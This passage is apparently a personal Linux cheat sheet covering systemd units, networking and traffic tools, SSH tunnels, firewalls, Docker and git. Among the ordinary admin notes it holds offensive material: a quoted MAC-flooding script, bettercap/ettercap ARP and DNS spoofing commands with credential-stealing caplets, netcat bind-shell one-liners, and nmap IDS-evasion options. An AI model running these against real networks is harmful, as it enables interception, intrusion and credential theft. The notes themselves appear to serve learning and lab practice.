>         is entered, the cause will be logged, for later reference. Note that the various unit types may have a number of additional substates, which are
>         mapped to the five generalized unit states described here.
>
>         The following unit types are available:
>
>          1. Service units, which start and control daemons and the processes they consist of. For details, see systemd.service(5).
>
>          2. Socket units, which encapsulate local IPC or network sockets in the system, useful for socket-based activation. For details about socket units,
>             see systemd.socket(5), for details on socket-based activation and other forms of activation, see daemon(7).
>
>          3. Target units are useful to group units, or provide well-known synchronization points during boot-up, see systemd.target(5).
>
>          4. Device units expose kernel devices in systemd and may be used to implement device-based activation. For details, see systemd.device(5).
>
>          5. Mount units control mount points in the file system, for details see systemd.mount(5).
>
>          6. Automount units provide automount capabilities, for on-demand mounting of file systems as well as parallelized boot-up. See
>             systemd.automount(5).
>
>          7. Timer units are useful for triggering activation of other units based on timers. You may find details in systemd.timer(5).
>
>          8. Swap units are very similar to mount units and encapsulate memory swap partitions or files of the operating system. They are described in
>             systemd.swap(5).
>
>          9. Path units may be used to activate other services when file system objects change or are modified. See systemd.path(5).
>
>         10. Slice units may be used to group units which manage system processes (such as service and scope units) in a hierarchical tree for resource
>             management purposes. See systemd.slice(5).
>
>         11. Scope units are similar to service units, but manage foreign processes instead of starting them as well. See systemd.scope(5).
>
>         Units are named as their configuration files. Some units have special semantics. A detailed list is available in systemd.special(7).

# Networking

## Misc

- `/etc/hosts.allow` (**deprecated**)
- `/etc/nsswitch.conf` contains configuration for DNS resolution order, as well as for other items
- `/etc/hosts` contains static DNS configuration (short-circuits external DNS resolution attempts)
  ```hosts
  192.168.0.100 myserver
  ```
  - **Mix and Match** Watch DNS traffic halt after manually resolving DNS lookups locally:
    - `tcpdump port 53` to monitor port 53 (DNS) traffic
    - `watch -n 0 arp` to make `arp` run repeatedly very quickly so we can see it attempt to resolve the IP addresses stored in the ARP cache to names for display
    - Add `<ip-addr> <name>` to `/etc/hosts`, save it, and watch the external DNS traffic dissappear due to resolving via the local hosts file
- `/etc/services` lists default port service designations
- See `resolvectl` in [systemd](#systemd-systemd-system-and-service-manager) for configuration of DNS resolvers

### Commands

- `host` (*DNS lookup utility*)
- `arping`
  - `arping -i eth0 192.168.0.51` to ARP ping that host via interface `eth0`
- `iftop` (*display bandwidth usage on an interface by host*)
- `ifstat` (*report interface activity, just like iostat/vmstat do for other system statistics*)
- `knock` (*port-knock client* from `knockd` package)
  - `knock myserver.example.com 123:tcp 456:udp 789:tcp` to test knock sequences on those ports on that server (I think)
- `socat` (multipurpose relay (SOcket CAT))
- `curl` ifconfig.me (get WAN IP address)
  - `-L` to follow redirects
  - `-v` for verbose output (often very useful)
- `cowrie` (*SSH/Telnet Honeypot*; <https://docs.cowrie.org/en/latest/index.html>)
  - `host1$ docker run -p 2222:2222 cowrie:latest`
  - `host2$ ssh root@localhost -p 2222`

## DHCP

- `dhclient`
- `dhcpcd` (*a DHCP client*)
  - `--release`
  - `--rebind`
  - `--renew`
  - `--dumplease [interface]` to dump lease information for all interfaces or for a specific one

## `netplan` (*Netplan runtime CLI*)

- `netplan`
  - Logging
    - `/var/log/cloud-init-output.log` contains log info
    - `/var/log/cloud-init.log` contains log info
      - **NOTE!** This log file can contain plaintext SSIDs and passwords when configuring wireless networking
  - Configuration
    - `/etc/netplan/50-cloud-init.yaml` is the default network configuration file for user
    - See `man netplan` for configuration details and <https://netplan.readthedocs.io/en/0.105/examples.html> for examples
  - `--debug` to enable debug messages
  - `netplan status`
  - `netplan generate`
  - `netplan try` to temporarily apply `netplan` configuration changes for testing and apply if confirmed
  - `netplan apply` to apply `netplan` configuration changes

## File Transfer

- See [`netcat`](#netcat-arbitrary-tcp-and-udp-connections-and-listens)
- See `telnet` (**TODO**)
- `scp` (*OpenSSH secure file copy*)
- `rsync` (*a fast, versatile, remote (and local) file-copying tool*)
  - `rsync -vaz large-directory <user>@<host>:<path>` will verbosely (`-v`) compress (`-z`) and recursively copy (`-a`, also preserving metadata) a directory to another host over SSH
- `sftp`

## Network Analysis

- See [`dnsutils`](#dnsutils)?
- `mtr` (*a network diagnostic tool*)
  - *mtr combines the functionality of the traceroute and ping programs in a single network diagnostic tool*
  - `mtr -t` runs `mtr` in terminal mode
- `nmap`
  - Do read the book: <https://nmap.org/book/toc.html>. Useful chapters:
    - <https://nmap.org/book/nmap-overview-and-demos.html>
      > In a pen-testing situation, you often want to scan every host even if they do not seem to be up. After all, they could just be heavily filtered in such a way that the probes you selected are ignored but some other obscure port may be available. To scan every IP whether it shows an available host or not, specify the -Pn option instead of all of the above.
    - <https://nmap.org/book/nmap-phases.html>
    - See <https://nmap.org/book/legal-issues.html> for practical suggestions on continuing exploration while avoiding trouble with ISPs, system administrators, and the law
  - Generally, you don't want to run the default scan settings, which do a bunch of things by default in an untargeted, unstealthy, and extremely fingerprintable (because default Nmap behavior is easily identifiable) way. Typically, you'll want to start with a few different types of host discovery scans before making different types of port scans, for example. This is to say that, in the real world, you won't be running a single comprehensive scan against even a mildly advanced target, you'll instead be breaking up your penetration into multiple chunks executed across some time delays. The point: You must come up with your own usage strategies depending your scenario because the defaults will not do -- you actually have to understand things.
  - `-oA myscan-%D` outputs results in every format to files named `myscan-<date>.<extension>`
  - `-v` verbose mode shows additional detail, including less reliable guesses on targets, depending on the scan type
  - `-Pn` to treat all hosts as online (skip host discovery)
  - Port scanning:
    - Manpage:
      > The state is either open, filtered, closed, or unfiltered.  Open
      > means that an application on the target machine is listening for connections/packets on that port.  Filtered
      > means that a firewall, filter, or other network obstacle is blocking the port so that Nmap cannot tell
      > whether it is open or closed.  Closed ports have no application listening on them, though they could open up
      > at any time. Ports are classified as unfiltered when they are responsive to Nmap's probes, but Nmap cannot
      > determine whether they are open or closed. Nmap reports the state combinations open|filtered and
      > closed|filtered when it cannot determine which of the two states describe a port.
    - `-sn` to disable port scanning
    - `-sS` for TCP SYN scan (requires root)
      - *The default scan type when running as `root`*
      - Fast, reliable, and relatively unobtrusive and stealthy
      - AKA "half-open" scanning, because you don't complete TCP connections, you just make the request to establish a connection and then drop, awaiting response to determine port status
    - `-sT` for TCP connect scan
      - *The default scan when not running as `root`*
    - `-sV` enables version scanning
    - `-sC` enables script scanning
    - `-p-` to scan all 65,535 ports rather than 1,000 most common
    - `-A` enables `-O`, `-sV`, `-sC`, and `--traceroute`
  - `-sI` to perform an idle (zombie) scan
    - Typically used with `-Pn` to prevent pings originating from true IP in compliance with `-sI`
  - `-n` to disable reverse DNS resolution
  - `-O` enables OS detection
  - `--traceroute` enables traceroute
  - `--packet-trace` details the packets being sent
  - `-iL <file>` to read target hosts from a file
  - `-T<template>` to set the dynamic timing template for a particular scan type
    - Manpage:
      > The first two are for IDS evasion. Polite mode slows down the scan to use less bandwidth and target machine
      > resources. Normal mode is the default and so -T3 does nothing. Aggressive mode speeds scans up by making
      > the assumption that you are on a reasonably fast and reliable network. Finally insane mode assumes that
      > you are on an extraordinarily fast network or are willing to sacrifice some accuracy for speed.
    - `paranoid` or `0`
    - `sneaky` or `1`
    - `polite` or `2`
    - `normal` or `3`
    - `aggressive` or `4`
    - `insane` or `5`
  - Uses ARP requests by default for LAN-based host discovery
- `tracepath` (*traces path to a network host discovering MTU along this path*; **from `iputils`**; typically use `traceroute` instead)
- `traceroute` (*print the route packets trace to network host*)
  - `traceroute google.com` traces the route from you to `google.com`
    - You can use `whois <host>` to assess different hops and see who the traffic is being routed through
- `whois` (*client for the whois directory service*)
  - `whois <host>`

## Traffic Analysis and Manipulation

- `tcpdump` (*dump traffic on a network*)
  - Compared to `tshark`: quick and simplex filtering; lightweight and widely available (pre-installed on most systems); uses `libpcap` for backend
  - `tcpdump not host <host>` to monitor all traffic not associated with `<host>`
  - `tcpdump -p` to monitor traffic destined to or originating from our host (disable promiscuous mode)
  - `tcpdump port <port> or host <host>` to monitor a specific port or host's traffic
  - `tcpdump -w traffic.cap` to capture traffic to `traffic.cap`
  - `tcpdump -r traffic.cap` to read traffic from `traffic.cap`
  - `-c <capture-count>` to stop capturing after `<capture-count>` packets
- `tshark` (*dump and analyze network traffic*; TUI version of Wireshark)
  - Compared to `tcpdump`: generally just richer; more complex filtering; deep protocol analysis; more scriptable; prettier output; more output formats; more protocols; uses `libpcap` + dissection engine for backend
  - Filters
    - Capture and display filters use entirely different syntax:
      - `tshark -f 'not host <host>'` to capture traffic with *capture* filter
        - or `tshark not host <host>` as shorthand
      - `tshark -Y 'ip.addr==<addr>'` to capture traffic and apply *display* filter to output
    - Capture filters are much more efficient than display filters
    - A capture filter applies to all interfaces if specified before the first `-i` option, and to the last `-i` interface if specified after the first `-i` option
    - Capture filters can be specified multiple times
  - `tshark --hexdump all host <host> and port <port>` to print a full hexdump (`--hexdump all`) of traffic captured that matches the specified host and port

## `scapy` (*interactive packet manipulation tool*)

- See <https://scapy.readthedocs.io/en/latest/usage.html>
- `help` builtin is useful as always (mostly not sarcastic)
- `ls` (*list available layers, or info on a given layer class or name*)
  - `ls()` to list layers
  - `ls(layer)` to list info on a layer
  - `ls(ICMP)` to see the fields of the ICMP packet protocol
  - `ls(ICMP())` to see the fields of the ICMP packet protocol after initialization (shows default init values)
- Sending and Receiving
  - Layer 3 (standard)
    - `send(packets, iface=None)` to send packets at layer 3
    - `sr(packets)` to send/receive packets at layer 3
  - Layer 2 (specify custom `Ether` header)
    - `sendp(packets, iface=None)` to send packets at layer 2
    - `srp(packets)` to send/receive packets at layer 2
  - `ans,unans = _` to read latest packets received
  - `response.summary()` and `response.show()` both print a summary of details of a response
- Crafting
  - `<packet2>/<packet1>` to stack `<packet1>` within `<packet2>`
    - Eg, `packet = IP(dst='google.com') / ICMP()` crafts an ICMP ping packet
  - `dhcp_discover_packet = Ether(src='00:11:22:33:44:55', dst='ff:ff:ff:ff:ff:ff') / IP(src='0.0.0.0', dst='255.255.255.255') / DHCP(options=[('message-type', 'discover'), 'end'])`
    - `sendp(dhcp_discover_packet)`
  - Make and inspect two DNS queries, one to `1.1.1.1` (Cloudflare's DNS) and one to `8.8.8.8` (Google's DNS)
    - (See DNS record query types <https://en.wikipedia.org/wiki/List_of_DNS_record_types>)
    ```python
    dns_query_packet = IP(dst=['1.1.1.1', '8.8.8.8']) / UDP(dport=53) / DNS(qd=DNSQR(qname='secdev.org', qtype='A'))

    # 1) Inspect both DNS queries and answers...
    for query,answer in results:
        query.show()  # Equivalent to results[<idx>].query.show()
        answer.show()  # Equivalent to results[<idx>].answer.show()

    # 2) ...or just inspect the first DNS query and answer
    results[0].query.show()
    results[0].answer.show()
    ```
- Sniffing (Capturing) and Inspecting
  - `sniff` (*sniff packets and return a list of packets*)
    - `sniff(offline='traffic.cap')` to read a packet capture file instead of sniff
    - `sniff()` to sniff on all interfaces
    - `sniff(iface=<interface>, prn=<function>, filter=<filter>)` to sniff on a particular interface and apply a function to each packet
      - Example function: `prn=lambda p: p.summary()`
      - Example filter: `filter='port 80'`
    - Sniff HTTP requests:
      ```python
        from scapy.all import sniff
        from scapy.layers.http import HTTPRequest

        def process_packet(packet):
            if packet.haslayer(HTTPRequest):
                url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
                ip = packet[IP].src
                method = packet[HTTPRequest].Method.decode()
                print(f'[+] {ip} Requested {url} with {method}')

        # Start sniffing the network on the default interface for HTTP traffic
        sniff(filter='port 80', prn=process_packet, store=False)
      ```
  - `wrpcap('traffic.cap', packets)` to write captured packets to a packet capture file
  - `rdpcap('traffic.cap')` to read a packet capture file
  - `traceroute('google.com')` to run a traceroute on `google.com`
  - `tshark()` to sniff (capture) and print packets in a `tshark`-like format
  - `wireshark(packets)` to run Wireshark on a pre-captured list of packets

### Attacks

- There are one-liners available to perform ARP cache poisoning
- CAM overflow / MAC flooding (<https://github.com/0xbharath/scapy-scripts>)
  ```python
  #-------------------------------------------------------------------------------#
  #     A script to perform CAM overflow attack on Layer 2 switches               #
  #                   Bharath(github.com/yamakira)                                #
  #                                                                               #
  #     CAM Table Overflow is all about flooding switches CAM table               #
  #     with a lot of fake MAC addresses to drive the switch into HUB mode.       #
  #-------------------------------------------------------------------------------#

  #!/usr/bin/env python
  from scapy.all import Ether, IP, TCP, RandIP, RandMAC, sendp


  #destMAC = "FF:FF:FF:FF:FF:FF"

  '''Filling packet_list with ten thousand random Ethernet packets
     CAM overflow attacks need to be super fast.
     For that reason it's better to create a packet list before hand.
  '''
  def generate_packets():
      packet_list = []		#initializing packet_list to hold all the packets
      for i in xrange(1,10000):
          packet  = Ether(src = RandMAC(),dst= RandMAC())/IP(src=RandIP(),dst=RandIP())
          packet_list.append(packet)

  def cam_overflow(packet_list):
  # sendpfast(packet,iface='tap0', mbps)
      sendp(packet_list, iface='tap0')


  if __name__ == '__main__':
      packet_list = generate_packets()
      cam_overflow(packet_list)
  ```

## Ettercap and Bettercap

- `ettercap` (*multipurpose sniffer/content filter for man in the middle attacks*; **version>0.7.0**) **TODO: Test this more thoroughly and come up with more examples**
  - `ettercap -T`
  - `ettercap -T -M arp:local -P dns_spoof <targets-spec>` to start a TUI-based `ettercap` session (`-T`), activate an ARP-based MITM attack targeting localhost (`-M arp:local`), and run the `dns_spoof` plugin (`-P dns_spoof`), all against targets `<targets-spec>`.
    - `<targets-spec>`:
      - Takes the form of `MAC/IPs/ports`
      - `11:22:33:44:55:66/192.168.0-1.0-255,10.0.0.1/0-20` to specify a target of that MAC address, those IPs, and those ports
      - `//0-20` to specify target of any MAC address, any IP, and ports 0-20
  - `/etc/ettercap/etter.dns` (*host file for dns_spoof plugin*; specifies target host file modifications during DNS spoofing attack)
- `bettercap` is a newer version of `ettercap` which primarily operates interactively (a standard tool in MiTM)
  - <https://www.bettercap.org/>
  - Caplets (**NOTE**: Most of the vulnerabilities that these exploit are supposedly **older and ineffective**)
    - `bettercap -caplet /usr/local/share/bettercap/caplets/crypto-miner.cap -eval "set arp.spoof.targets 10.10.10.102"` to use a caplet
    - `crypto-miner.cap` - Deploy crypto-mining JavaScript in all HTTP requests
    - `local-sniffer.cap` - Use Bettercap as a local sniffer with protocol-filtering options
    - `login-man-abuse.cap` - Exploit browser built-in login managers to steal credentials
    - `fb-phish.cap` - Create a fake Facebook login page to collect credentials
    - `rogue-mysql-server.cap` - Impersonate and intercept MySQL server connections
    - `simple-passwords-sniffer.cap` - Capture any network activity with password= in the payload
    - `stsoy.cap` - Spoof all DNS responses for Microsoft and Google, serving up BeEF hooks
    - `web-override.cap` - Replace every unencrypted web page with a static page of the adversary's choosing
  - `bettercap -iface eth0` to start an interactive session (**you should specify an interace so it doesn't choose loopback**)
  - `help` to show help
    - `help <module>` to show status of module and available commands
  - `net.show` to show list of cached hosts
  - `net.recon` module (*read periodically the ARP cache in order to monitor for new hosts on the network*; passive monitoring of ARP cache to determine hosts on network)
    - `help net.recon` to show help for the `net.recon` module
    - `net.recon on` to start host discovery (on by default)
    - `net.recon off` to stop host discovery
  - `net.probe` module (*keep probing for new hosts on the network by sending dummy UDP packets to every possible IP on the subnet*; active probing to determine hosts on network)
    - `net.probe on`
    - `net.probe off`
    - Observe:
      - `net.probe on`
      - `tcpdump arp` to see to ARP requests continuously being fired out
      - `watch -n 0 arp -n` to see ARP requests continuously being received (`-n` to avoid spamming DNS requests due to running `arp` repeatedly via `watch`)
      - `net.probe off` and see it all stop
  - `arp.spoof` module (*keep spoofing selected hosts on the network*)
    - `set arp.spoof.targets <IP1,IP2,...>` to set IP addresses to target, comma-separated
    - `arp.spoof on` to start active hosts discovery (UPNP, mDNS, NBNS, WSD)
    - `arp.spoof off` to stop active hosts discovery
  - `dns.spoof` module (*replies to DNS messages with spoofed responses*)
    - `dns.spoof on`
    - `dns.spoof off`
    - `set dns.spoof.address <address>` to set the IP address to return for spoofed DNS answers
    - `set dns.spoof.domains <domain1,domain2,...>` to set a list of domain targets for DNS spoofing, comma-separated
    - `set dns.spoof.all <bool>` to perform DNS spoofing for all requests regardless of domain, hosts file
    - `set dns.spoof.hosts <hostsfile>` to perform DNS spoofing for the entries mapped in `<hostsfile>`

## `proxychains` (*redirect connections through proxy servers*)

- `proxychains`
  - `proxychains` captures the network traffic (eg, Nmap TCP scan pings) of any given command and redirects it through proxies specified in the configuration file
    - Configuration: `/etc/proxychains(4).conf`
      - You can specify which proxies (eg, `socks4 172.0.0.1 9050`) to go through, how to go through them, timeouts, and more
  - `ssh -NR 9050 10.90.50.200` to set up a remote SSH SOCKS proxy (see section on SSH)
    - Port `9050` because it's the default localhost proxy specified in the `proxychains` config file
    - `proxychains nmap -vv 192.168.0.0/24` on the remote to tunnel `nmap` network traffic through the SSH SOCKS proxy, which encrypts and masks the network traffic
      - Observe the scan through Wireshark and note that the encrypted scan traffic appears to originate from the client rather than the remote (`10.90.50.200`)

## SSH

- `ssh-copy-id` (*use locally available keys to authorise logins on a remote machine*)
- `-v` can be useful when troubleshooting

### Configuration

- `~/.ssh/authorized_keys` on a server contains the public keys of client users allowed to connect to your server account via SSH
- `~/.ssh/known_hosts` on a client's machine contains the public host keys of servers (stored on the server in `/etc/ssh/ssh_host_*_key.pub`) previously connected to or otherwise known
  - This is used to detect MITM attacks by having the server verify its identity
  - SSH clients will usually warn and ask for confirmation on new or changed (eg, domain provides different public host key than known) server public host keys before going through the handshake signature for full public/private keypair verification
- `/etc/ssh/ssh_host_..._key.pub` files on a server are a server's public host key files that are used by the SSH daemon to authenticate the server
- Modifying `~/.ssh/config` with
  ```
  Host myserver
      HostName 192.168.1.10
      User yourusername
      IdentityFile ~/.ssh/id_ed25519
      Port 2220
  ```
  ...allows you to do `ssh myserver` as a shorthand for future connections

### Local and Remote Tunneling

- `ssh -N` (*do not execute a remote command; useful for just forwarding ports*)
- Local SSH Tunnel
  - `ssh -L [<client>:]<client-port>:<host>:<host-port> <remote>` to set up an SSH tunnel from `<client>` (`localhost` if not specified) on port `<client-port>` to `<host>:<host-port>` via `<remote>`
  - `ssh -NL 1234:unixwiz.net:80 192.168.0.71` to set up a local SSH tunnel to `unixwiz.net:80` via `192.168.0.71`
    - Use `localhost:1234` to communicate with `unixwiz.net:80`, using `192.168.0.71` as proxy
      - Eg, `curl localhost:1234` sends a `GET` request to `unixwiz.net:80` via `192.168.0.71`, who then forwards the reply back to the client
    - `ss -tpl` shows `127.0.0.1:1234` listening locally
      - This is observable through Wireshark. You won't see any requests to `unixwiz.net:80` originating from the client, just `192.168.0.71`
      - `curl` doesn't know anything about the forwarding. It simply makes the request, and SSH forwards it back and forth between the client and server.
- Reverse (Remote) SSH tunnel
  - `ssh -R <remote-port>:<host>:<host-port> <remote>` to set up a reverse SSH tunnel from `<remote>:<remote-port>` to `<host>:<host-port>` via client
  - Allows the remote to use tools from their machine as if they were on the client's network rather than having to move their tools to the client
    - **NOTE; VERIFY THIS**: You'll have to proxy some of your tools' network traffic through the SSH tunnel client since the tools you're running (eg, `nmap`) may encode your IP as the origin before being sent through the SSH tunnel client (see section on `proxychains`)
    - Eg, with a web service forwarded locally to their machine, they can interact that service the way they'd interact with any service accessable via their machine
  - `ssh -NR 1234:unixwiz.net:80 192.168.0.71` to set up a reverse SSH tunnel from `192.168.0.71:1234` to `unixwiz.net:80` via client
    - Use `localhost:1234` on the remote to communicate with `unixwiz.net`, using the client as proxy
    - `ss -tpl` on the remote shows `127.0.0.1:1234` listening locally
  - `ssh -NR 1234:192.168.0.1:80 10.90.50.200`
    - Allows remote at `10.90.50.200` listening on their `localhost:1234` to communicate with client's router `192.168.0.1:80`, via the client on their internal network
    - `ss -tpl` on the remote shows `127.0.0.1:1234` listening locally
    - Opening `localhost:1234` in a browser will allow the remote to interact with the client's router
- Dynamic Reverse (Remote) SSH tunnel using SOCKS proxy
  - SOCKS (Wikipedia: *SOCKS is an Internet protocol that exchanges network packets between a client and server through a proxy server*)
    - `curl` and most browsers support SOCKS, while most tools do not support SOCKS
  - `ssh -NR 1234 10.90.50.200` to set up a dynamic reverse SSH SOCKS tunnel
    - `curl -vL --socks4 127.0.0.1:1234 unixwiz.net` on remote to make a `GET` request to `unixwiz.net` via client
    - `curl -vL --socks4 127.0.0.1:1234 192.168.0.1` on remote to make a `GET` request to the client's router via client
- Dynamic Local SSH tunnel using SOCKS proxy
  - Use to enter a client's network
  - `ssh -ND 1234 10.90.50.200` on client to set up a local SSH SOCKS proxy bound to server `10.90.50.200:1234`
    - `curl -vL --socks4 127.0.0.1:1234 unixwiz.net` on client to make a `GET` request to `unixwiz.net` via the server
    - `curl -vL --socks4 127.0.0.1:1234 192.168.0.1` on client to make a `GET` request to the remote's router via the server

## netfilter Firewall Framework

- `iptables` was used to manage Linux's netfilter firewall framework, with a front-end utility called `ufw` which is supposedly transitioning into a front-end for the preferred `nftables`. `iptables` is now considered **legacy** in favor of `nftables`. All three utilities are still currently widely available.

### `nftables` (*Administration tool of the nftables framework for packet filtering and classification*)

*nft is the command line tool used to set up, maintain and inspect packet filtering and classification rules in the Linux kernel, in the nftables framework. The Linux kernel subsystem is known as nf_tables, and ‘nf’ stands for Netfilter*

### `ufw` (*program for managing a netfilter firewall*)

- `ufw enable` to enable the firewall
- `ufw disable` to disable the firewall
- `ufw reload` to reload the firewall
- `ufw reset` to reset the firewall
- `ufw status numbered` to view the firewall status
- `ufw allow 22` to allow port 22
- `ufw deny from 1.2.3.4` to deny an IP
- `ufw delete 1` to delete rule 1

### `iptables` (*administration tool for IPv4/IPv5 packet filtering and NAT*; **legacy**, prefer `nftables`)

- `iptables --version` *displays program version and the kernel API used* (eg, `nf_tables`)
- `iptables -t nat -L` to list (`-L`) NAT table (`-t nat`) rules
- `iptables -t nat -D POSTROUTING 1` to delete (`-D`) the first (`1`) NAT table rule in the `POSTROUTING` chain
- `iptables -t nat -A POSTROUTING -s 192.168.0.0/16 -o ens4 -j MASQUERADE` to NAT-forward traffic from a range of hosts via our IP address
  - Requires (I think) `sysctl -w net.ipv4.ip_forward=1` to allow IP forwarding at all on the host

#### Flags

- `-n` displays IP addresses instead of resolved names (eg, `0.0.0.0/0` instead of `anywhere`)
- `-t nat` specifies that we're working with the NAT table rules
- `-A POSTROUTING` appends to the `POSTROUTING` chain
  - A chain is where along the chain of processing a rule is applied
  - The `POSTROUTING` chain applies rules to traffic after routing decisions have already been made, but before the traffic leaves the system
- `-s 192.168.0.0/16` specifies the source range of IP addresses that a rule would match
- `-o ens4` specifies which interface to send matching traffic out through
- `-j MASQUERADE` specifies the match action for the rule (what to do when the rule matches)
  - The `MASQUERADE` action (AKA `MASQ`) maps the source IP address of matching traffic to our IP address
    - It is only available in the NAT table in the POSTROUTING chain

## `netcat` (*arbitrary TCP and UDP connections and listens*)

- **NOTE**: Exact syntax depends on `netcat-traditional` vs `netcat-openbsd` vs `nmap`'s `ncat` and exact version
  - `netcat-traditional` requires `-p` to specify port when listening, while `netcat-openbsd` does not
- `nc <address> 22` to see if SSH is running on host
- Scan: `nc -z <host> 1-65535` to scan all ports on `<host>` (may wish to use with `-z` for progress)
- Simple communication
  - `host1$ nc -l -p 1234` to listen on a host
  - `host2$ nc <host1> 1234` to send traffic to the listening host
  - `host3$ nc <host1> 1234 -c "<command>"` to send the `stdout` of `<command>` to the listening host and close connection
  - `host4$ nc <host1> 1234 -c "<command> 2>&1"` to send the `stdout` *and* `stderr` of `<command>` to the listening host and close connection
- Simple traffic logging
  - `host1$ nc -l -p 1234 -o nc-traffic.hex` to listen on a host and redirect messages to file
  - `host1$ xxd -r nc-traffic.hex` to reverse subseqent traffic hex
- Simple reverse shell
  - Using modern `netcat` (**with `-e` available**)
    - `host1$ nc -l -p 1234 -e /bin/bash` to execute all received messages via bash
    - `host2$ nc <host1> 1234` to establish connection to listener
    - `<command>` from `host2` during remote session to execute `<command>` on the listener's system
  - Using older `netcat` (**no `-e` available**)
    - Listener (victim, if hacking scenario):
      - `rm -f /tmp/commands; mkfifo /tmp/commands` to make a temporary input stream that we can redirect to `bash`
      - `cat /tmp/commands | /bin/bash -i 2>&1 | nc -l -p 1234 > /tmp/commands`
    - Client (adversary, if hacking scenario)
      - `nc <listener-address> 1234` to connect
- Transfer a file to another host
  - `host1$ nc -l -p 1234 > rx-file` to listen for connections and redirect stream to file
  - `host2$ nc -N <host1> 1234 << tx-file` to transfer a file and close the connection (`-N`) on EOF
- Transfer an SSH public key from client to listener
  - `host1$ nc -l -p 1234 >> ~/.ssh/authorized_keys` to listen and append transferred key to `authorized_keys`
  - `host2$ nc -N <host1> 1234 < ~/.ssh/key.pub` to transfer the key file to listener and close the connection (`-N`) on EOF
- Transfer an SSH public key from listener to client
  - Scenario: I needed to do this one time because I couldn't set up a listener (accept inbound connections from the LAN) because WSL was behind a NAT. Instead, I set up a listener on the machine who wanted to send, and had the listener send the file.
  - `host1$ nc -l -p 1234 < <(tail -n 1 ~/.ssh/authorized_keys)` to listen for connections, while putting the specified contents in the stream
  - `host2$ nc <host1> 1234 > ~/.ssh/key.pub` to grab the contents of that file and redirect it to the proper file

## `dnsutils`

- `dig` (*dig is a flexible tool for interrogating DNS name servers*)
- `nslookup` (*nslookup is a program to query Internet domain name servers*)
  - `nslookup 7-zip.org` to get the IP for `7-zip.org`

## `net-tools` (**deprecated** in favor of `iproute2`)

- `netstat` (*print network connections, routing tables, interface statistics, masquerade connections, and multicast memberships*; use `ss` instead)
  - `netstat -r` to display the kernel routing tables (`route -e` produces the same output) (**replaced by `ip route`**)
  - `netstat -tupa` and other variations to see services exposed by your device
  - `netstat -pa | grep -i ssh` to find sockets/programs running `ssh`, and users/uids with established SSH connections
  - `netstat -i` to display all network interfaces (**replaced by `ip -s link`**)
    - *NOTE: Almost certainly use `watch -n 1 w` instead for this use case
- `ifconfig` (*configure a network interface*; use `ip` instead)
  - `ifconfig -v -a -s` to view short (`-s`) list of all (`-a`) interfaces (up *and* down) with additional error message detail (`-v`)
- `route`
  - `route -n` to see routes without resolving addresses to names (`-n`)
  - `route -e` to see routes using netstat format

## `iproute2` (replaces `net-tools`)

- `ss` (*another utility to investigate sockets*)
  - `ss -a | grep -i ssh` to find sockets/programs running `ssh`, and uids with established SSH connections
- `ip` (*show / manipulate routing, network devices, interfaces and tunnels*)
  - `-br` for brief output (supported by `addr`, `link`, `neigh`)
  - `addr`
    - `ip addr del 192.168.0.88/24 dev ens33` to delete that IP prefix on that interface
  - `monitor` (*watch for netlink messages*)
    - Useful when setting up or modifying interfaces, routes, etc
  - `neigh` (*show current neighbor table in kernel*) (ARP or NDISC cache entries)
  - `route` (*show table routes*)
  - `link` (*show current link-layer links between interfaces* and MAC addresses)
    - `ip -s link` to show all link statistics
    - `ip -s link show eth0` to show `eth0` interface statistics
- `tc` (*show / manipulate traffic control settings*)

# Docker

- See the Docker CLI reference: <https://docs.docker.com/reference/cli/docker>
- See the Dockerfile reference: <https://docs.docker.com/reference/dockerfile>
- See Docker Hub image search: <https://hub.docker.com/search>

## Example Uses

- [./docker-examples/](./docker-examples/)
- [Inventory Management System](https://github.com/holychowders/inventory_management_system)

## Useful Images

- The `alpine` image is very small, making it really fast to pull down, start up, and has `busybox` pre-installed by default. This all allows for quick testing.
- The `python:3.xx-alpine` images are typically slimmer than the `python:3.xx-slim` slim Debian images, but have fewer features

## Misc Commands

- `docker scout` (check vulnerabilities in base images; extremely nifty)
  - `docker scout recommendations` to get recommendations on last built image
  - `docker scout recommendations --tag <image>` to get recommendations
- `docker network`:
  - `docker network ls` lists networks available to connect to a container
  - `docker network inspect <network-name>` to inspect a network's configuration, including connected containers and their IP addresses
- `docker builder prune -a` to remove all image build cache

## Images

- `docker image prune` to remove dangling images (images not tagged or referenced by any containers)
  - `-a` to remove all images currently unused (without an associated running container)
- `docker [image] build . -t <image-name>:<optional-tag>` to build the image specified by the current directory's Dockerfile
  - `docker [image] build . -o tempfs` to build an image from current directory's Dockerfile and dump its filesystem to a directory
- `docker image[s | ls]` to list images
  - `-q` to list IDs only
- `docker [container] commit <container> [<image-name>:<tag>]` persists a running container as a new image

## Containers

- `docker container ls` or `docker [container] ps` to see running containers
  - `-a` to see all containers
  - `-q` to list container IDs only
- `docker [container] inspect <container>` to view a container's configuration
- `docker [container] top <container>` to list a container's running processes
- `docker [container] exec -it <container> <command>` to execute `<command>` in interactive mode with an explicitly allocated TTY
  - Use the same command without `-it` to execute a non-interactive command (one which does not expect STDIN to remain open during execution) within a container
    - For example, `apk --version` would execute and exit, no input/interaction required, just output
- `docker [container] attach <container>` to attach to a container
- Stopping containers:
  - `docker [container] stop <container>` to stop a container from running
  - `docker [container] stop $(docker ps -q)` to stop all containers from running
  - `docker [container] kill <container>` to forcefully kill (SIGKILL by default) a container
- Removing containers:
  - `docker [container] rm [-f] <container>` to remove a container
    - `-f` to forcefully kill (SIGKILL) if running and then remove
  - `docker [container] prune` to remove all stopped containers

### Launching

- `docker [container] start <container>` (*start one or more stopped containers*)
- `docker [container] run` (*create and run a new container from an image*)
  - `-a` to attach STDOUT/STDERR
  - `docker [container] run -[d]it [--rm | --restart=always] [--name <container-name>] <image-name>` starts up a container and attaches to an interactive shell for the container of the specified image.
    - `--rm` deletes container on stop
    - `-d` starts detached
    - `--restart=always` restarts the container under all circumstances (reboot, crash, etc) execpt manual stop/kill via Docker
    - `--name <container-name>` provides a name to the container
  - `docker [container] run -dit  --name <container>  --network <network-name>  <image-name>  sh` creates and starts up a container with the assigned name, network, and image. It starts in detached mode running `sh`.
    - *NOTE*: New containers are generally added to the default bridge network, `docker0`

# Git

- `git log --diff-filter=A -- <relative-path/file>` to search logs for diffs where a file was added
- `git filter-repo` (*rewrite repository history*; external tool)
  - `git filter-repo --replace-text replacements.txt`
  - `--dry-run`
  - `--path <path>` to preserve only that path in the repo history
  - `--invert-paths --path <path1> --path <path2>` to delete those paths from the repo history
  - Dry run and preview:
    - `--dry-run`
    - `diff --color .git/filter-repo/fast-export.original .git/filter-repo/fast-export.filtered` to preview changes
